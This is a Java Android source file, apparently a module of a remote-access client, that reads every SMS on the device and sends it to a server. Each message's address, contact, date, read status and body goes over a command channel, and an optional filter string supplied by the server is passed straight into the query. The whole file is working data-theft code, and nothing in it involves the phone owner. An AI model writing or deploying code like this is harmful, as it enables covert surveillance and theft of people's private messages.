package my.app.Library;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import Packet.SMSPacket;
import Packet.SMSTreePacket;
import my.app.client.ClientListener;

/**
 * Diese Klasse extrahiert alles auf dem Gerät befindlichen SMS und schickt diese an den Server
 */
public class SMSLister {

	//ClientListener ctx;
	//int channel;

	/**
	 * Diese Funktion erstellt eine Abfrage für die gespeicherten SMS.
	 * Zusätzlich wird hier der Filter eingbeaut, sofern nach bestimmten Telefonnummern oder Schlüsselwörtern gesucht werden soll.
	 * @param c	 Der Service der diese Methode aufruft
	 * @param channel	Der Kanal zur Datenübertragung
	 * @param args	Hierbei handelt es sich um die Argumente nachden die SMS gefilter werden sollen
	 * @return	true wenn es SMS gibt, false wenn nicht.
	 */
	public static boolean listSMS(ClientListener c, int channel, byte[] args) {
		/**
		 * In der ArrayList l werden alles SMSPackete gespeichert. Aus diesem Array wird später das Paket welches an den Server gesendet wird
		 */
		ArrayList<SMSPacket> l = new ArrayList<SMSPacket>();
		/**
		 * ret ist der return-Wert dieser Methode. Er wird am Anfang auf false gesetzt.
		 */
		boolean ret = false;
		/**
		 * Hierbei handelt es sich um den Filter. Die SMS werden nachden übergebenen Argumenten gefiltert
		 */
		String WHERE_CONDITION = new String(args);
		/**
		 * Die SMS werden in absteigender Ordnung zurückgegeben.
		 */
		String SORT_ORDER = "date DESC";
		/**
		 * Die Spalten welche ausgelesen werden sollen.
		 */
		String[] column = { "_id", "thread_id", "address", "person", "date","read" ,"body", "type" };
		/**
		 * Die Tabelle die ausgelesen werden soll.
		 */
		String CONTENT_URI = "content://sms/"; //content://sms/inbox, content://sms/sent
		/**
		 * In der Variablen cursor werden die Ergebnisse der Abfrage gespeichert.
		 */
		Cursor cursor = c.getContentResolver().query(Uri.parse(CONTENT_URI), column , WHERE_CONDITION, null, SORT_ORDER);

		/**
		 * Sollte der cursor Daten enthalten so wird er auf das erste Element der Liste gesetzt.
		 */
        if(cursor.getCount() != 0) {
	        cursor.moveToFirst();
	
	        do{
				/**
				 * Hier wird überprüft ob diese Stelle überhaupt Spaöten mit Daten besitzt.
				 */
	           if(cursor.getColumnCount() != 0) {
				   /**
					* Ist dies der Fall so werden die Inhalte der verschiedenen Spalten in variablen zwischen gespeichert.
					*/
	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
	        	   int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
	        	   String add = cursor.getString(cursor.getColumnIndex("address"));
	        	   int person = cursor.getInt(cursor.getColumnIndex("person"));
	        	   long date  = cursor.getLong(cursor.getColumnIndex("date"));
	        	   int read = cursor.getInt(cursor.getColumnIndex("read"));
	        	   String body = cursor.getString(cursor.getColumnIndex("body"));
	        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
				   /**
					* Danach wird mit Hilfe dieser Variablen ein neues SMSPacket erstellt, welche dann der ArrayListe k hinzugefügt wird.
					*/
	        	   l.add(new SMSPacket(id, thid, add, person, date, read, body, type));
	           }
	        }
			/**
			 * Dies wird solang wiederholt solange es eine nächste Position für den cursor gibt.
			 */
			while(cursor.moveToNext());
			/**
			 * Hier wird der return-Wert auf true gesetzt, was bedeutet, dass es Inhalte der SMSListe gibt.
			 */
	        ret = true;
        }
        else
		/**
		 * Sollte der cursor Count null sein so wird ret auf false gesetzt.
		 */
        	ret = false;

		/**
		 * Zum Schluss wird noch ein neues SMSTreePacket erstellt, dem die ArrayListe l übergeben wird und dieses dann
		 * an den Server geschickt.
		 */
		c.handleData(channel, new SMSTreePacket(l).build());
		/**
		 * Return ret damit das Programm weiß ob es eine SMS Liste gab oder nicht.
		 */
		return ret;
	}
	
}
